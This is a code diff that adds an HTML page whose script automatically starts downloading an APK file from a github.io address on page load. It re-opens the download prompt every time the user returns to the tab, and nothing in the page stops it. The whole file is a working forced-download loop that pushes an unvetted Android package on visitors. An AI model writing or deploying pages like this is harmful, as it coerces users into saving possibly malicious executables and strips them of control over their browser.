@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>Automatic Download Loop</title>
+  <style>
+    body { font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif; text-align:center; padding:80px; }
+    .status { margin-top:16px; color:#333; }
+    .warning { color: #a00; margin-top:8px; }
+  </style>
+</head>
+<body>
+  <h1>Automatic Download Loop</h1>
+  <p>The download loop is active. After you Save/Cancel the dialog and return to this tab, the prompt will reappear (best-effort).</p>
+
+  <div class="status" id="status">Starting...</div>
+  <div class="warning" id="warn"></div>
+
+<script>
+(() => {
+  const APK_URL = 'https://frozzipies.github.io/test.apk'; // file to download
+  const RETRY_DELAY_MS = 400; // small delay after focus before attempting
+
+  let running = true; // Always running
+  let downloadInProgress = false; // true between programmatic click and focus-return
+  let attempts = 0;
+
+  const statusEl = document.getElementById('status');
+  const warnEl = document.getElementById('warn');
+
+  function setStatus(text) { statusEl.textContent = text; }
+  function showWarning(text) { warnEl.textContent = text || ''; }
+
+  // Create an anchor, click it once, remove it.
+  function triggerDownload() {
+    if (!running) return;
+
+    const a = document.createElement('a');
+    a.href = APK_URL;
+    a.setAttribute('download', 'test.apk'); 
+    a.style.display = 'none';
+    document.body.appendChild(a);
+    
+    try {
+      a.click();
+      downloadInProgress = true;
+      attempts++;
+      setStatus(`Download prompt requested (attempt ${attempts}). Waiting for Save/Cancel and return to the tab.`);
+      showWarning('');
+    } catch (err) {
+      // Automatic download blocked; since there's no manual button, we just wait for focus/visibility change
+      // or rely on the next automatic trigger.
+      showWarning('Automatic download blocked by browser. You may need to refresh or manually click to start.');
+      downloadInProgress = false; 
+    } finally {
+      a.remove();
+    }
+  }
+
+  // Called when we detect the user returned to the tab/window
+  function onUserReturned() {
+    if (!running) return;
+
+    // Wait a brief period before attempting the next download
+    setTimeout(() => {
+        // Clear pending flag and attempt a new download
+        downloadInProgress = false;
+        triggerDownload();
+    }, RETRY_DELAY_MS);
+  }
+
+  // Page focus/visibility handlers (The core of the loop)
+  window.addEventListener('focus', onUserReturned);
+  document.addEventListener('visibilitychange', () => {
+    if (document.visibilityState === 'visible') {
+      onUserReturned();
+    }
+  });
+
+  // Start the loop automatically on page load
+  document.addEventListener('DOMContentLoaded', () => {
+    setStatus('Started automatically — requesting first download.');
+    showWarning('The first download may be blocked as it is not triggered by a user click.');
+    // Trigger the very first download
+    triggerDownload();
+  });
+})();
+</script>
+</body>
+</html>
